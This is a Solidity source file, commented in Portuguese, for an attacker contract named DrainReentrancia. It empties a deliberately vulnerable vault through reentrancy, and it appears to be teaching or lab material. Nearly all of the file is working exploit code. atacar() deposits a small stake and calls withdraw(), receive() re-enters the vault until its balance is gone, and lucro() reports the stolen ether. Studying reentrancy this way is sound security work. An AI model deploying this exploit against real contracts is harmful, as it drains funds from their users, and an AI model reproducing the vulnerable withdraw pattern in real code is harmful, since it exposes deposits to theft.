// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VaultVulneravel} from "./VaultVulneravel.sol";

/// @title DrainReentrancia — o atacante
/// @notice Esvazia um VaultVulneravel usando reentrância.
///
/// COMO A REENTRÂNCIA FUNCIONA, PASSO A PASSO
/// ─────────────────────────────────────────
/// 1. `atacar()` deposita 1 wei no vault (o capital de giro).
/// 2. Chama `vault.withdraw()`. O vault lê saldos[atacante] == 1 wei.
/// 3. O vault envia 1 wei para este contrato via `.call`.
/// 4. ** receive() é disparado antes de o withdraw() do vault terminar. **
///    Isso é o pulo do gato: a EVM reentrou no vault.
/// 5. receive() chama `vault.withdraw()` de novo. O vault olha
///    saldos[atacante] — que **ainda é 1**, porque a linha
///    `balances[msg.sender] = 0` do passo 3 ainda NÃO rodou.
/// 6. Volta pro passo 4. E assim por diante, até o ETH acabar.
///
/// A linha 5 é o bug inteiro: o vault leu uma verdade e só depois
/// virou o registro. Quem ler o código procurando bugs vai procurar
/// exatamente esse tipo de dessincronização entre "o que eu li" e
/// "o que eu escrevi depois".
contract DrainReentrancia {
    VaultVulneravel public immutable alvo;

    /// Quantas vezes o receive() disparou (= quantas voltas demos).
    uint256 public voltas;

    /// Teto de segurança: se algo der errado, paramos em vez de looping eterno.
    uint256 public constant MAX_VOLTAS = 200;

    error ReentranciaNaoTerminou();

    constructor(VaultVulneravel _alvo) {
        alvo = _alvo;
    }

    /// @param capitalDeGiro quanto o atacante deposita para começar o laço.
    function atacar(uint256 capitalDeGiro) external {
        require(capitalDeGiro > 0, "capital de giro precisa ser > 0");
        require(address(alvo).balance > capitalDeGiro, "vault precisa ter mais que o capital");

        alvo.deposit{value: capitalDeGiro}();

        // Esta chamada não "termina" até o receive() parar de reconectar.
        alvo.withdraw();
    }

    /// Destino do ETH enviado pelo vault. É aqui que a reentrância acontece.
    receive() external payable {
        voltas++;

        if (address(alvo).balance > 0) {
            if (voltas >= MAX_VOLTAS) revert ReentranciaNaoTerminou();
            alvo.withdraw(); // <-- a volta
        }
    }

    /// ETH que o atacante ficou. Em um vault de 100 ETH com giro de 1 wei,
    /// isso é aproximadamente 100 ETH.
    function lucro() external view returns (uint256) {
        return address(this).balance;
    }
}
